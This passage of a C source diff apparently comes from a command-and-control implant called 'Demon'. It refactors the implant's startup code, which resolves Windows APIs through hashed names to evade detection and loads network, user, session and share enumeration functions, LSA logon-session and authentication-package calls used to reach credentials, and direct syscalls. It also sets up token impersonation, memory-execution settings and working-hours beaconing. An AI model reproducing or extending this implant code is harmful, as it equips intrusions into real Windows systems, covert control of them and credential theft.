+        Instance.Win32.WinHttpConnect           = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPCONNECT );
+        Instance.Win32.WinHttpOpenRequest       = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPOPENREQUEST );
+        Instance.Win32.WinHttpSetOption         = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPSETOPTION );
+        Instance.Win32.WinHttpCloseHandle       = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPCLOSEHANDLE );
+        Instance.Win32.WinHttpSendRequest       = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPSENDREQUEST );
+        Instance.Win32.WinHttpAddRequestHeaders = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPADDREQUESTHEADERS );
+        Instance.Win32.WinHttpReceiveResponse   = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPRECEIVERESPONSE );
+        Instance.Win32.WinHttpReadData          = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPREADDATA );
+        Instance.Win32.WinHttpQueryHeaders      = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPQUERYHEADERS );
 
         PUTS( "Loaded WinHttp functions" )
     }
 #endif
 
-    if ( Instance.Modules.Mscoree )
-    {
-        Instance.Win32.CLRCreateInstance = LdrFunctionAddr( Instance.Modules.Mscoree, FuncHash_CLRCreateInstance );
+    /* load mscoree.dll functions */
+    if ( Instance.Modules.Mscoree ) {
+        Instance.Win32.CLRCreateInstance = LdrFunctionAddr( Instance.Modules.Mscoree, H_FUNC_CLRCREATEINSTANCE );
     }
 
-    if ( Instance.Modules.Iphlpapi )
-    {
-        Instance.Win32.GetAdaptersInfo = LdrFunctionAddr( Instance.Modules.Iphlpapi, FuncHash_GetAdaptersInfo );
+    /* load Iphlpapi.dll functions */
+    if ( Instance.Modules.Iphlpapi ) {
+        Instance.Win32.GetAdaptersInfo = LdrFunctionAddr( Instance.Modules.Iphlpapi, H_FUNC_GETADAPTERSINFO );
     }
 
-    if ( Instance.Modules.NetApi32 )
-    {
-        Instance.Win32.NetLocalGroupEnum = LdrFunctionAddr( Instance.Modules.NetApi32, FuncHash_NetLocalGroupEnum );
-        Instance.Win32.NetGroupEnum      = LdrFunctionAddr( Instance.Modules.NetApi32, FuncHash_NetGroupEnum );
-        Instance.Win32.NetUserEnum       = LdrFunctionAddr( Instance.Modules.NetApi32, FuncHash_NetUserEnum );
-        Instance.Win32.NetWkstaUserEnum  = LdrFunctionAddr( Instance.Modules.NetApi32, FuncHash_NetWkstaUserEnum  );
-        Instance.Win32.NetSessionEnum    = LdrFunctionAddr( Instance.Modules.NetApi32, FuncHash_NetSessionEnum );
-        Instance.Win32.NetShareEnum      = LdrFunctionAddr( Instance.Modules.NetApi32, FuncHash_NetShareEnum );
-        Instance.Win32.NetApiBufferFree  = LdrFunctionAddr( Instance.Modules.NetApi32, FuncHash_NetApiBufferFree  );
+    /* load netApi32.dll functions */
+    if ( Instance.Modules.NetApi32 ) {
+        Instance.Win32.NetLocalGroupEnum = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETLOCALGROUPENUM );
+        Instance.Win32.NetGroupEnum      = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETGROUPENUM );
+        Instance.Win32.NetUserEnum       = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETUSERENUM );
+        Instance.Win32.NetWkstaUserEnum  = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETWKSTAUSERENUM );
+        Instance.Win32.NetSessionEnum    = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETSESSIONENUM );
+        Instance.Win32.NetShareEnum      = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETSHAREENUM );
+        Instance.Win32.NetApiBufferFree  = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETAPIBUFFERFREE );
 
         PUTS( "Loaded NetApi32 functions" )
     }
 
-    if ( Instance.Modules.Ws2_32 )
-    {
-        Instance.Win32.WSAStartup      = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_WSAStartup );
-        Instance.Win32.WSACleanup      = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_WSACleanup );
-        Instance.Win32.WSASocketA      = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_WSASocketA );
-        Instance.Win32.WSAGetLastError = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_WSAGetLastError );
-        Instance.Win32.ioctlsocket     = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_ioctlsocket  );
-        Instance.Win32.bind            = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_bind );
-        Instance.Win32.listen          = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_listen  );
-        Instance.Win32.accept          = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_accept );
-        Instance.Win32.closesocket     = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_closesocket );
-        Instance.Win32.recv            = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_recv );
-        Instance.Win32.send            = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_send );
-        Instance.Win32.connect         = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_connect );
-        Instance.Win32.getaddrinfo     = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_getaddrinfo );
-        Instance.Win32.freeaddrinfo    = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_freeaddrinfo );
+    /* load ws2_32.dll functions */
+    if ( Instance.Modules.Ws2_32 ) {
+        Instance.Win32.WSAStartup      = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_WSASTARTUP );
+        Instance.Win32.WSACleanup      = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_WSACLEANUP );
+        Instance.Win32.WSASocketA      = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_WSASOCKETA );
+        Instance.Win32.WSAGetLastError = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_WSAGETLASTERROR );
+        Instance.Win32.ioctlsocket     = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_IOCTLSOCKET );
+        Instance.Win32.bind            = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_BIND );
+        Instance.Win32.listen          = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_LISTEN );
+        Instance.Win32.accept          = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_ACCEPT );
+        Instance.Win32.closesocket     = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_CLOSESOCKET );
+        Instance.Win32.recv            = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_RECV );
+        Instance.Win32.send            = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_SEND );
+        Instance.Win32.connect         = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_CONNECT );
+        Instance.Win32.getaddrinfo     = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_GETADDRINFO );
+        Instance.Win32.freeaddrinfo    = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_FREEADDRINFO );
 
         PUTS( "Loaded Ws2_32 functions" )
     }
 
-    if ( Instance.Modules.Sspicli )
-    {
-        Instance.Win32.LsaRegisterLogonProcess        = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaRegisterLogonProcess );
-        Instance.Win32.LsaLookupAuthenticationPackage = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaLookupAuthenticationPackage );
-        Instance.Win32.LsaDeregisterLogonProcess      = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaDeregisterLogonProcess );
-        Instance.Win32.LsaConnectUntrusted            = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaConnectUntrusted );
-        Instance.Win32.LsaFreeReturnBuffer            = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaFreeReturnBuffer );
-        Instance.Win32.LsaCallAuthenticationPackage   = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaCallAuthenticationPackage );
-        Instance.Win32.LsaGetLogonSessionData         = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaGetLogonSessionData );
-        Instance.Win32.LsaEnumerateLogonSessions      = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaEnumerateLogonSessions );
+    /* load sspicli.dll functions */
+    if ( Instance.Modules.Sspicli ) {
+        Instance.Win32.LsaRegisterLogonProcess        = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAREGISTERLOGONPROCESS );
+        Instance.Win32.LsaLookupAuthenticationPackage = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSALOOKUPAUTHENTICATIONPACKAGE );
+        Instance.Win32.LsaDeregisterLogonProcess      = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSADEREGISTERLOGONPROCESS );
+        Instance.Win32.LsaConnectUntrusted            = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSACONNECTUNTRUSTED );
+        Instance.Win32.LsaFreeReturnBuffer            = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAFREERETURNBUFFER );
+        Instance.Win32.LsaCallAuthenticationPackage   = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSACALLAUTHENTICATIONPACKAGE );
+        Instance.Win32.LsaGetLogonSessionData         = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAGETLOGONSESSIONDATA );
+        Instance.Win32.LsaEnumerateLogonSessions      = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAENUMERATELOGONSESSIONS );
     }
 
     PUTS( "Set basic info" )
 
-    if ( ! NT_SUCCESS( Instance.Syscall.NtQuerySystemInformation( SystemProcessorInformation, &SystemInfo, sizeof( SYSTEM_PROCESSOR_INFORMATION ), 0 ) ) )
-    PUTS( "[!] NtQuerySystemInformation Failed" );
+    if ( ! NT_SUCCESS( Instance.Syscall.NtQuerySystemInformation( SystemProcessorInformation, &SystemInfo, sizeof( SYSTEM_PROCESSOR_INFORMATION ), 0 ) ) ) {
+        PUTS( "[!] NtQuerySystemInformation Failed" );
+    }
 
-    if ( ! Instance.Session.ModuleBase )
+    if ( ! Instance.Session.ModuleBase ) {
         /* if we specified nothing as our ModuleBase then this either means that we are an exe or we should use the whole process */
         Instance.Session.ModuleBase = LdrModulePeb( 0 );
+    }
 
-    Instance.Session.OS_Arch     = SystemInfo.ProcessorArchitecture;
-    Instance.Session.PID         = (DWORD)(ULONG_PTR)Instance.Teb->ClientId.UniqueProcess;
-    Instance.Session.ProcessArch = PROCESS_AGENT_ARCH;
-    Instance.Session.Connected   = FALSE;
-    Instance.Session.AgentID     = RandomNumber32(); // generate a random ID
-    Instance.Config.AES.Key      = NULL;
-    Instance.Config.AES.IV       = NULL;
+    Instance.Session.OS_Arch   = SystemInfo.ProcessorArchitecture;
+    Instance.Session.PID       = U_PTR( Instance.Teb->ClientId.UniqueProcess );
+    Instance.Session.Connected = FALSE;
+    Instance.Session.AgentID   = RandomNumber32();
+    Instance.Config.AES.Key    = NULL; /* TODO: generate keys here  */
+    Instance.Config.AES.IV     = NULL;
 
     /* Linked lists */
-    Instance.Tokens.Vault        = NULL;
-    Instance.Tokens.Impersonate  = FALSE;
-    Instance.Jobs                = NULL;
-    Instance.Downloads           = NULL;
-    Instance.Sockets             = NULL;
+    Instance.Tokens.Vault       = NULL;
+    Instance.Tokens.Impersonate = FALSE;
+    Instance.Jobs               = NULL;
+    Instance.Downloads          = NULL;
+    Instance.Sockets            = NULL;
 
     /* Global Objects */
     Instance.Dotnet = NULL;
@@ -872,11 +861,11 @@ VOID DemonConfig()
     Instance.Config.Memory.Execute = ParserGetInt32( &Parser );
 
     PRINTF(
-            "[CONFIG] Memory: \n"
-            " - Allocate: %d  \n"
-            " - Execute : %d  \n",
-            Instance.Config.Memory.Alloc,
-            Instance.Config.Memory.Execute
+        "[CONFIG] Memory: \n"
+        " - Allocate: %d  \n"
+        " - Execute : %d  \n",
+        Instance.Config.Memory.Alloc,
+        Instance.Config.Memory.Execute
     )
 
     Buffer = ParserGetBytes( &Parser, &Length );
@@ -912,7 +901,7 @@ VOID DemonConfig()
     {
         // refuse to run
         // TODO: exit process?
-        Instance.Win32.RtlExitUserThread(0);
+        Instance.Win32.RtlExitUserThread( 0 );
     }
     Instance.Config.Transport.WorkingHours   = ParserGetInt32( &Parser );
     Instance.Config.Transport.Method         = L"POST"; /* TODO: make it optional */
